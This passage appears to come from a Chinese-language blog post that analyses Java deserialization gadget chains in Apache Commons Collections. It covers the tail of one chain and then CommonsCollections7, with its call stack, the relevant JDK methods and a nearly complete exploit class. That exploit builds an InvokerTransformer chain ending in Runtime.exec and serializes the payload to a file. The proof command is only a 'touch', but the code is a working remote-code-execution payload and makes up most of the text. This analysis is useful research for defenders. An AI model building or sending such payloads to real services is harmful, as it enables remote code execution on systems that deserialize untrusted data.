</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;invoke&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>null</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;exec&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;/bin/touch&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;/dev/shm/asdasd_1&#34;</span><span style=color:#ff79c6>}}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ChainedTransformer<span style=color:#ff79c6>(</span>fake<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        HashMap innerMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        LazyMap lazyMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>LazyMap<span style=color:#ff79c6>)</span> LazyMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>decorate</span><span style=color:#ff79c6>(</span>innerMap<span style=color:#ff79c6>,</span> chainedTransformer<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        TiedMapEntry tiedMapEntry <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TiedMapEntry<span style=color:#ff79c6>(</span>lazyMap<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;placeholder&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        HashMap hashMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        hashMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>tiedMapEntry<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;zzzz&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Field field <span style=color:#ff79c6>=</span> chainedTransformer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;iTransformers&#34;</span><span style=color:#ff79c6>);</span> <span style=color:#6272a4>// 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>chainedTransformer<span style=color:#ff79c6>,</span> transformers<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        innerMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>clear</span><span style=color:#ff79c6>();</span> <span style=color:#6272a4>// 清除 LazyMap 产生的缓存
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>hashMap<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>同样, 这套 exp 在 3, 4 都是通用的, 只需要更改 <code>LazyMap.decorate</code> 即可, 在 4 中是 <code>LazyMap.LazyMap</code>, 效果是是一样的, 只是方法名换了一个.</p><h2 id=commonscollections7>CommonsCollections7</h2><p>仍然先看调用栈:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Payload method chain:
</span></span><span style=display:flex><span>    java.util.Hashtable.readObject
</span></span><span style=display:flex><span>    java.util.Hashtable.reconstitutionPut
</span></span><span style=display:flex><span>    org.apache.commons.collections.map.AbstractMapDecorator.equals
</span></span><span style=display:flex><span>    java.util.AbstractMap.equals
</span></span><span style=display:flex><span>    org.apache.commons.collections.map.LazyMap.get
</span></span><span style=display:flex><span>    org.apache.commons.collections.functors.ChainedTransformer.transform
</span></span><span style=display:flex><span>    org.apache.commons.collections.functors.InvokerTransformer.transform
</span></span><span style=display:flex><span>    java.lang.reflect.Method.invoke
</span></span><span style=display:flex><span>    sun.reflect.DelegatingMethodAccessorImpl.invoke
</span></span><span style=display:flex><span>    sun.reflect.NativeMethodAccessorImpl.invoke
</span></span><span style=display:flex><span>    sun.reflect.NativeMethodAccessorImpl.invoke0
</span></span><span style=display:flex><span>    java.lang.Runtime.exec
</span></span></code></pre></div><p>仍然是用 LazyMap 导致 RCE, 相比 TransformingComparator, LazyMap 在 3, 4 中都可以用, 泛用性会更好. 这里触发 Lazy.get 的方式是利用 HashMap/Hashtable readObject 会重建内部的哈希表的特性. 在遇到 hash 碰撞的时候, 会调用其中一个对象的 equals 方法来对比两个对象是否相同来判断是否真的是 hash 碰撞. 在这之中使用的是父类 <code>AbstractMap</code> 的 equals 方法.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>boolean</span> <span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>Object o<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>o <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>true</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!(</span>o <span style=color:#ff79c6>instanceof</span> Map<span style=color:#ff79c6>))</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    Map<span style=color:#ff79c6>&lt;?,?&gt;</span> m <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Map<span style=color:#ff79c6>&lt;?,?&gt;)</span> o<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>m<span style=color:#ff79c6>.</span><span style=color:#50fa7b>size</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>!=</span> size<span style=color:#ff79c6>())</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span>Entry<span style=color:#ff79c6>&lt;</span>K<span style=color:#ff79c6>,</span> V<span style=color:#ff79c6>&gt;</span> e <span style=color:#ff79c6>:</span> entrySet<span style=color:#ff79c6>())</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            K key <span style=color:#ff79c6>=</span> e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getKey</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>            V value <span style=color:#ff79c6>=</span> e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getValue</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>value <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!(</span>m<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>&amp;&amp;</span> m<span style=color:#ff79c6>.</span><span style=color:#50fa7b>containsKey</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>)))</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span>value<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>m<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>key<span style=color:#ff79c6>)))</span> <span style=color:#6272a4>// &lt;-- 对于我们的 exp 来说, 会在这里会触发
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>                    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>ClassCastException unused<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>NullPointerException unused<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>true</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>可以看到这个方法比较两个 Map 的大小, 并对比所有 key, value 都相等. 在其中使用了 get 方法, 触发了 Lazy.get.
在 ysoseiral 中使用的是 Hashtable 类, 实际上 HashMap 也是能够触发的.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>final</span> V <span style=color:#50fa7b>putVal</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> hash<span style=color:#ff79c6>,</span> K key<span style=color:#ff79c6>,</span> V value<span style=color:#ff79c6>,</span> <span style=color:#8be9fd>boolean</span> onlyIfAbsent<span style=color:#ff79c6>,</span>
</span></span><span style=display:flex><span>                   <span style=color:#8be9fd>boolean</span> evict<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Node<span style=color:#ff79c6>&lt;</span>K<span style=color:#ff79c6>,</span>V<span style=color:#ff79c6>&gt;[]</span> tab<span style=color:#ff79c6>;</span> Node<span style=color:#ff79c6>&lt;</span>K<span style=color:#ff79c6>,</span>V<span style=color:#ff79c6>&gt;</span> p<span style=color:#ff79c6>;</span> <span style=color:#8be9fd>int</span> n<span style=color:#ff79c6>,</span> i<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>((</span>tab <span style=color:#ff79c6>=</span> table<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>(</span>n <span style=color:#ff79c6>=</span> tab<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> 0<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        n <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>tab <span style=color:#ff79c6>=</span> resize<span style=color:#ff79c6>()).</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>((</span>p <span style=color:#ff79c6>=</span> tab<span style=color:#ff79c6>[</span>i <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>n <span style=color:#ff79c6>-</span> 1<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;</span> hash<span style=color:#ff79c6>])</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        tab<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> newNode<span style=color:#ff79c6>(</span>hash<span style=color:#ff79c6>,</span> key<span style=color:#ff79c6>,</span> value<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Node<span style=color:#ff79c6>&lt;</span>K<span style=color:#ff79c6>,</span>V<span style=color:#ff79c6>&gt;</span> e<span style=color:#ff79c6>;</span> K k<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>p<span style=color:#ff79c6>.</span><span style=color:#50fa7b>hash</span> <span style=color:#ff79c6>==</span> hash <span style=color:#ff79c6>&amp;&amp;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>((</span>k <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span><span style=color:#50fa7b>key</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> key <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>(</span>key <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>&amp;&amp;</span> key<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>k<span style=color:#ff79c6>))))</span>  <span style=color:#6272a4>// &lt;-- 这里进入 AbstractMap.equals
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>            e <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>p <span style=color:#ff79c6>instanceof</span> TreeNode<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>            e <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>((</span>TreeNode<span style=color:#ff79c6>&lt;</span>K<span style=color:#ff79c6>,</span>V<span style=color:#ff79c6>&gt;)</span>p<span style=color:#ff79c6>).</span><span style=color:#50fa7b>putTreeVal</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>,</span> tab<span style=color:#ff79c6>,</span> hash<span style=color:#ff79c6>,</span> key<span style=color:#ff79c6>,</span> value<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> binCount <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> <span style=color:#ff79c6>;</span> <span style=color:#ff79c6>++</span>binCount<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>((</span>e <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span><span style=color:#50fa7b>next</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                    p<span style=color:#ff79c6>.</span><span style=color:#50fa7b>next</span> <span style=color:#ff79c6>=</span> newNode<span style=color:#ff79c6>(</span>hash<span style=color:#ff79c6>,</span> key<span style=color:#ff79c6>,</span> value<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>binCount <span style=color:#ff79c6>&gt;=</span> TREEIFY_THRESHOLD <span style=color:#ff79c6>-</span> 1<span style=color:#ff79c6>)</span> <span style=color:#6272a4>// -1 for 1st
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>                        treeifyBin<span style=color:#ff79c6>(</span>tab<span style=color:#ff79c6>,</span> hash<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>break</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>hash</span> <span style=color:#ff79c6>==</span> hash <span style=color:#ff79c6>&amp;&amp;</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>((</span>k <span style=color:#ff79c6>=</span> e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>key</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> key <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>(</span>key <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>&amp;&amp;</span> key<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>k<span style=color:#ff79c6>))))</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>break</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>                p <span style=color:#ff79c6>=</span> e<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>e <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span> <span style=color:#6272a4>// existing mapping for key
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>            V oldValue <span style=color:#ff79c6>=</span> e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>value</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span>onlyIfAbsent <span style=color:#ff79c6>||</span> oldValue <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>                e<span style=color:#ff79c6>.</span><span style=color:#50fa7b>value</span> <span style=color:#ff79c6>=</span> value<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>            afterNodeAccess<span style=color:#ff79c6>(</span>e<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> oldValue<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>++</span>modCount<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(++</span>size <span style=color:#ff79c6>&gt;</span> threshold<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        resize<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    afterNodeInsertion<span style=color:#ff79c6>(</span>evict<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>最后 exp 如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.Transformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ChainedTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ConstantTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.InvokerTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.map.LazyMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.HashMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>CommonsCollections7</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> fake <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;placeholder&#34;</span><span style=color:#ff79c6>),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span>java<span style=color:#ff79c6>.</span><span style=color:#50fa7b>lang</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>Runtime</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;getMethod&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Class<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;getRuntime&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;invoke&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>null</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;exec&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;/bin/touch&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;/dev/shm/asdasd_1&#34;</span><span style=color:#ff79c6>}}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ChainedTransformer<span style=color:#ff79c6>(</span>fake<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        HashMap innerMap1 <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;();</span>
</span></span><span style=display:flex><span>        innerMap1<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;yy&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;1&#34;</span><span style=color:#ff79c6>);</span> <span style=color:#6272a4>// &#34;yy&#34;.hashCode() == &#34;zZ&#34;.hashCode() == 3872
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        HashMap innerMap2 <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;();</span>
</span></span><span style=display:flex><span>        innerMap2<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;zZ&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;1&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        LazyMap lazyMap1 <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>LazyMap<span style=color:#ff79c6>)</span> LazyMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>decorate</span><span style=color:#ff79c6>(</span>innerMap1<span style=color:#ff79c6>,</span> chainedTransformer<span style=color:#ff79c6>);</span>
